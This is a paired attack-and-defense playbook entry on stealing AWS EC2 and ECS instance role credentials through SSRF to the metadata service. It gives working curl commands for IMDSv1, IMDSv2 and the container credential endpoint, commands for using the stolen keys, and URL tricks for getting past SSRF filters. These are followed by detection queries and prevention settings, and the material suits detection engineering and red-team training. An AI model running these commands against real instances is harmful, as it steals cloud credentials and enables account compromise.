name: AWS IMDS SSRF - Steal EC2/ECS Role Credentials
description: Abuse a server-side request forgery (SSRF) primitive on an EC2 instance (or a direct shell) to reach the Instance Metadata Service at 169.254.169.254 and steal the temporary AWS credentials of the attached IAM role. IMDSv1 answers any GET; IMDSv2 requires a PUT to obtain a session token first (X-aws-ec2-metadata-token) which SSRF often cannot send.
notes:
=== WHAT YOU ARE AFTER ===
  The link-local metadata endpoint 169.254.169.254 serves the temporary
  STS credentials (AccessKeyId/SecretAccessKey/Token) of the instance role.

=== IMDSv1 (direct GET - works through most SSRF) ===
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  # that returns the role name, then:
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
  # JSON with AccessKeyId, SecretAccessKey, Token, Expiration

=== IMDSv2 (token-first - needs a PUT, often blocks blind SSRF) ===
  TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

=== ECS TASK ROLE (containers) ===
  # the task role creds URI is in an env var, fetched from 169.254.170.2
  curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

=== USE THE STOLEN CREDS ===
  export AWS_ACCESS_KEY_ID=...  AWS_SECRET_ACCESS_KEY=...  AWS_SESSION_TOKEN=...
  aws sts get-caller-identity
  aws s3 ls

=== SSRF DELIVERY TRICKS (when a web app fetches a URL) ===
  http://169.254.169.254/...            # direct
  http://[::ffff:169.254.169.254]/...   # IPv6-mapped bypass
  http://instance-data/latest/...       # alt hostname
  # DNS-rebinding / redirect chains to defeat allowlists

=== ALTERNATIVES / NEXT ===
  Once you hold the role creds, enumerate with Pacu or pmapper.

defense.why_it_works: The IMDS endpoint 169.254.169.254 is reachable from any process on the instance and, with IMDSv1, answers unauthenticated GETs. A web app with SSRF can be coerced into making that GET and returning the role's temporary credentials.
defense.prerequisites: An SSRF primitive in an app running on EC2, or any code execution on the instance/container. IMDSv1 enabled (or an SSRF that can send the IMDSv2 PUT and custom header).
defense.impact: Theft of the instance/task IAM role's temporary credentials, giving the attacker every permission that role holds - frequently S3, DynamoDB, or further IAM reach leading to full account compromise.
defense.detection: [MITRE T1552.005] CloudTrail shows the role's temporary credentials being used from an IP outside the instance (sourceIPAddress not the instance ENI / not an AWS internal address), or API calls the role has never made before; GuardDuty raises UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.
defense.artifacts: CloudTrail events with userIdentity.type=AssumedRole and the instance role's session name used from an external sourceIPAddress; VPC flow logs rarely show IMDS (link-local) but web-app logs show the SSRF request to 169.254.169.254.
defense.splunk_spl:
index=aws sourcetype=aws:cloudtrail userIdentity.sessionContext.sessionIssuer.type=Role
| search userIdentity.arn="*:assumed-role/*"
| stats values(eventName) dc(sourceIPAddress) as ips by userIdentity.arn
| where ips>1
defense.sentinel_kql:
AWSCloudTrail
| where UserIdentityType == "AssumedRole"
| where SourceIpAddress !startswith "10." and SourceIpAddress !startswith "172."
| summarize Calls=count(), Events=make_set(EventName) by UserIdentityArn, SourceIpAddress
defense.prevention: Enforce IMDSv2 and set HttpTokens=required and HttpPutResponseHopLimit=1 on every instance; block egress to 169.254.169.254 from app runtimes that do not need it; scope instance roles to least privilege; enable GuardDuty InstanceCredentialExfiltration detection; fix the SSRF (allowlist outbound hosts, deny link-local ranges).

detections.name: Instance role credentials used from outside AWS
detections.logic:
index=aws sourcetype=aws:cloudtrail userIdentity.type=AssumedRole
| stats dc(sourceIPAddress) as srcips values(eventName) as events by userIdentity.arn
| where srcips>1
detections.false_positives: NAT changes or legitimate use of role creds from multiple instances behind one egress IP
detections.tuning: Baseline each instance role's normal source IPs and alert on new external IPs; correlate with GuardDuty InstanceCredentialExfiltration
